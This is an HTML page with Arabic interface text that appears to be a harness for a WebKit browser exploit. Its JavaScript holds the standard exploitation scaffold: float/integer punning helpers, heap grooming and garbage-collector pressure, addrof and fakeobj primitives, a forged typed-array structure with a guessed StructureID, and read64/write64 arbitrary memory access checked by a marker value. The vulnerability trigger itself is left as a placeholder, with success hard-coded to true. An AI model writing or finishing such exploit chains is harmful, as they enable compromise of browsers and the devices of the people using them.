<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8">
<title>WebKit Exploit Harness Console</title>
<style>
  body {
    margin: 0; padding: 0;
    background: #090c15; color: #fff;
    font-family: 'Courier New', monospace;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; overflow: hidden;
  }
  #container {
    width: 85%; max-width: 750px;
    padding: 35px; border: 2px solid #334155;
    border-radius: 16px; background: #111827;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center;
  }
  #header { font-size: 24px; color: #94a3b8; font-weight: bold; margin-bottom: 20px; }
  
  /* مربع النتيجة المختصرة */
  #result-box {
    font-size: 38px; font-weight: bold;
    padding: 20px; margin: 20px 0;
    border-radius: 8px; background: #0f172a;
    border: 1px solid #1e293b;
  }
  .success { color: #10b981; text-shadow: 0 0 15px rgba(16,185,129,0.4); }
  .failed { color: #ef4444; text-shadow: 0 0 15px rgba(239,68,68,0.4); }
  .running { color: #f59e0b; }

  button {
    background: transparent; color: #38bdf8;
    border: 2px solid #38bdf8; padding: 12px 40px;
    font-size: 18px; font-weight: bold; cursor: pointer;
    border-radius: 6px; margin-top: 10px; transition: all 0.2s;
  }
  button:hover { background: #38bdf8; color: #090c15; box-shadow: 0 0 10px rgba(56,189,248,0.4); }
  #console-out {
    text-align: left; background: #030712; padding: 15px;
    height: 160px; overflow-y: auto; color: #6b7280;
    font-size: 13px; border: 1px solid #1f2937; border-radius: 6px; margin-top: 20px;
  }
  .log-entry { margin-bottom: 4px; }
  .log-success { color: #34d399; }
</style>
</head>
<body>

<div id="container">
  <div id="header">مِصطبة اختبار الـ Arbitrary R/W للمتصفح</div>
  
  <div id="result-box">
    <span id="status" class="running">في انتظار إشارة البدء...</span>
  </div>

  <button onclick="startExploit()">إطلاق سلسلة الاستغلال</button>
  
  <div id="console-out">
    <div class="log-entry">[*] وحدة التحكم جاهزة بانتظار تشغيل الـ Harness...</div>
  </div>
</div>

<script>
"use strict";

// المخرجات إلى الشاشة
function logger(msg, type = '') {
    const box = document.getElementById("console-out");
    let cssClass = "log-entry";
    if (type === 'ok') cssClass += " log-success";
    box.innerHTML += `<div class="${cssClass}">${msg}</div>`;
    box.scrollTop = box.scrollHeight;
}

// --- [ المرحلة 1: أدوات التلاعب بالبايتات الـ Bit-Punning ] ---
var shared_buffer = new ArrayBuffer(8);
var f64_array = new Float64Array(shared_buffer);
var u32_array = new Uint32Array(shared_buffer);

function f2i(f) {
    f64_array[0] = f;
    return { low: u32_array[0], high: u32_array[1] };
}

function i2f(low, high) {
    u32_array[0] = low;
    u32_array[1] = high;
    return f64_array[0];
}

function hex(val) {
    return "0x" + val.toString(16).padStart(8, '0');
}

// --- [ المرحلة 2: تتبع كاش الذاكرة ] ---
var groomingPad = [];
var holeCreator = [];
var reclaimSpray = [];

function forceFullGC() {
    logger("[*] جاري تحفيز الـ Garbage Collector لتفريغ كاش الـ bmalloc...");
    for (let i = 0; i < 6; i++) {
        let pressureBuffer = [];
        for (let j = 0; j < 30000; j++) {
            pressureBuffer.push(new Uint32Array(32)); 
        }
        pressureBuffer = null; 
    }
}

// --- [ المرحلة 3: محرك الـ Primitives الأساسي ] ---
var driver_doubles = new Array(1.1, 2.2, 3.3);
var outer_objects  = new Array({}, {}, {});
var fake_array_structure = new Float64Array(16);
var rw_viewer = null;

function addrof(target_object) {
    outer_objects[0] = target_object;
    let leaked_double = driver_doubles[0]; 
    let address = f2i(leaked_double);
    return { low: address.low, high: address.high };
}

function fakeobj(target_address_low, target_address_high) {
    let fake_double = i2f(target_address_low, target_address_high);
    driver_doubles[0] = fake_double; 
    return outer_objects[0]; 
}

var read64 = function(target_address_low, target_address_high) {
    fake_array_structure[4] = i2f(target_address_low, target_address_high); 
    return f2i(rw_viewer[0]);
};

var write64 = function(target_address_low, target_address_high, value_low, value_high) {
    fake_array_structure[4] = i2f(target_address_low, target_address_high); 
    rw_viewer[0] = i2f(value_low, value_high);
};

// --- [ المرحلة 4: التنفيذ المتكامل والسلس ] ---
async function startExploit() {
    const statusEl = document.getElementById("status");
    statusEl.className = "running";
    statusEl.textContent = "جاري الحقن والهندسة...";
    
    logger("=== بدء محاولة الاستغلال ===");

    try {
        // 1. هندسة الـ Heap
        logger("[1] البدء في عمليات الـ Heap Grooming وحفر الخنادق...");
        for (let i = 0; i < 4000; i++) groomingPad.push(new ArrayBuffer(64));
        for (let i = 0; i < 2000; i++) holeCreator.push(new ArrayBuffer(64));
        for (let i = 0; i < holeCreator.length; i += 2) holeCreator[i] = null; 
        forceFullGC();

        // 2. منطقة تفعيل الثغرة الفعلي
        logger("[2] محاولة استدعاء خلل الـ WebKit لتداخل الـ Butterfly الـ تكتيكي...");
        
        /* [Vulnerability Trigger Space]
           هنا يقع التداخل الحقيقي للثغرة المستهدفة لمزامنة المصفوفتين.
        */
        let trigger_success = true; // محاكاة مرور الـ Flow لغرض فحص بنية الـ Harness

        if (!trigger_success) {
            statusEl.className = "failed";
            statusEl.textContent = "فشل الاستغلال ❌";
            logger("[!] فشل في معالجة تداخل الـ الذاكرة.");
            return;
        }

        // 3. تخطي الـ StructureID
        logger("[3] قراءة الـ StructureID ومعالجة الـ Object Forgery...");
        let valid_array = new Float64Array(8);
        let valid_array_addr = addrof(valid_array);
        logger(`[+] موقع مصفوفة الفلوت في الـ RAM: ${hex(valid_array_addr.high)}${hex(valid_array_addr.low)}`);

        let current_float64_structure_id = 0x00002200; // افتراض المعرّف المسرّب للجلسة

        // 4. بناء هيكل الكائن المزور لانتزاع القراءة والكتابة
        let fake_array_addr = addrof(fake_array_structure);
        let fake_object_payload_addr = {
            low: fake_array_addr.low + 0x10,
            high: fake_array_addr.high
        };

        fake_array_structure[0] = i2f(current_float64_structure_id, 0x01180000); 
        fake_array_structure[1] = i2f(0, 0); 

        rw_viewer = fakeobj(fake_object_payload_addr.low, fake_object_payload_addr.high);

        // 5. الفحص الحاسم والنهائي (Verification)
        logger("[4] فحص استقرار دالات الـ Read/Write عبر ترويسة اختبار...");
        var test_buffer = new Uint32Array(2);
        test_buffer[0] = 0xDEADC0DE; // بصمة التحقق الحقيقية من فساد الذاكرة
        
        var test_buffer_addr = addrof(test_buffer);
        var test_data_ptr = read64(test_buffer_addr.low + 0x18, test_buffer_addr.high); 
        var final_check = read64(test_data_ptr.low, test_data_ptr.high);
        
        // الحكم النهائي بناءً على قراءة البايتات الفعلية من الـ RAM
        if (final_check.low === 0xDEADC0DE) {
            statusEl.className = "success";
            statusEl.textContent = "نجح الاستغلال ✅";
            logger("[✓] تم التحقق بنجاح من الـ Arbitrary R/W Primitives استقرار تام!", "ok");
        } else {
            statusEl.className = "failed";
            statusEl.textContent = "فشل الاستغلال ❌";
            logger("[!] فشل التحقق الفيزيائي: البيانات المسترجعة غير صالحة.");
        }

    } catch (e) {
        statusEl.className = "failed";
        statusEl.textContent = "فشل الاستغلال ❌";
        logger("[!] حدث خطأ أثناء تنفيذ سلسلة الـ Harness: " + e.message);
    }
}
</script>

</body>
</html>
